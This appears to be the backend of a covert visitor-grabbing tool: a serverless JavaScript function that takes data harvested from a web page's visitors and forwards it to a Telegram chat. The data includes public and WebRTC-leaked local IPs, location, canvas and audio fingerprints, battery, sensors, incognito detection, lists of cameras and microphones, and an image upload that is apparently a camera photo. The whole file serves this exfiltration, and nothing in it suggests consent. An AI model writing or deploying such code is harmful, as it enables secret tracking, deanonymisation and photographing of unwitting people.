exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
      },
      body: ""
    };
  }

  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ error: "Method Not Allowed" })
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");
    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Faltan variables de entorno" })
      };
    }

    function clean(v) {
      if (v === undefined || v === null || v === "") return "N/A";
      return String(v);
    }

    let msg = "474747 - Nueva información\n\n";

    msg += "Red\n";
    msg += "• IP Pública: " + clean(data.ip) + "\n";
    msg += "• IP Local (WebRTC): " + clean(data.localIPs) + "\n";
    msg += "• País: " + clean(data.country) + "\n";
    msg += "• Ciudad: " + clean(data.city) + "\n";
    msg += "• Región: " + clean(data.region) + "\n";
    msg += "• ISP: " + clean(data.isp) + "\n";
    msg += "• Conexión: " + clean(data.conexion) + "\n";
    msg += "• RTT: " + clean(data.rtt) + "\n\n";

    msg += "Dispositivo\n";
    msg += "• OS: " + clean(data.os) + "\n";
    msg += "• Navegador: " + clean(data.browser) + "\n";
    msg += "• Tipo: " + clean(data.device) + "\n";
    msg += "• RAM: " + clean(data.ram) + "\n";
    msg += "• Núcleos: " + clean(data.nucleos) + "\n";
    msg += "• Pantalla: " + clean(data.pantalla) + " (" + clean(data.pixelRatio) + "x)\n";
    msg += "• Orientación: " + clean(data.orientacion) + "\n";
    msg += "• GPU: " + clean(data.gpuRenderer) + "\n\n";

    msg += "Fingerprints\n";
    msg += "• Canvas: " + clean(data.canvasFingerprint) + "\n";
    msg += "• Audio: " + clean(data.audioFingerprint) + "\n\n";

    msg += "Batería\n";
    msg += "• Nivel: " + clean(data.bateria) + "\n";
    msg += "• Estado: " + clean(data.cargando) + "\n";
    msg += "• Tiempo carga: " + clean(data.tiempoCarga) + "\n";
    msg += "• Tiempo descarga: " + clean(data.tiempoDescarga) + "\n\n";

    msg += "Sensores\n";
    msg += "• Acelerómetro: " + clean(data.acelerometro) + "\n";
    msg += "• Giroscopio: " + clean(data.giroscopio) + "\n\n";

    msg += "Detecciones\n";
    msg += "• AdBlock: " + clean(data.adblock) + "\n";
    msg += "• Incógnito: " + clean(data.incognito) + "\n";
    msg += "• Webdriver: " + clean(data.webdriver) + "\n\n";

    msg += "Media\n";
    msg += "• Cámaras: " + clean(data.cameras) + "\n";
    msg += "• Micrófonos: " + clean(data.mics) + "\n";
    msg += "• Altavoces: " + clean(data.speakers) + "\n\n";

    msg += "Otras\n";
    msg += "• Tiempo en página: " + clean(data.tiempoEnPagina) + "\n";
    msg += "• History: " + clean(data.historyLength) + "\n";
    msg += "• Táctil: " + clean(data.toque) + " (" + clean(data.maxTouchPoints) + ")\n";
    msg += "• Idioma: " + clean(data.idioma) + "\n";
    msg += "• Zona: " + clean(data.zonaHoraria) + "\n";
    msg += "• Referrer: " + clean(data.referrer) + "\n\n";

    msg += new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" });

    // Enviar texto
    const msgRes = await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    });

    const msgResult = await msgRes.json();
    if (!msgRes.ok) {
      console.error("Error texto:", msgResult);
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Error Telegram", details: msgResult })
      };
    }

    // Foto
    if (data.foto && typeof data.foto === "string" && data.foto.startsWith("data:image")) {
      try {
        const base64 = data.foto.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64, "base64");
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("caption", "Foto - 474747");
        form.append("photo", new Blob([buffer], { type: "image/jpeg" }), "foto.jpg");
        await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
          method: "POST",
          body: form
        });
      } catch (e) {
        console.error("Error foto:", e);
      }
    }

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
      },
      body: JSON.stringify({ success: true, message: "Enviado" })
    };

  } catch (error) {
    console.error(error);
    return {
      statusCode: 500,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
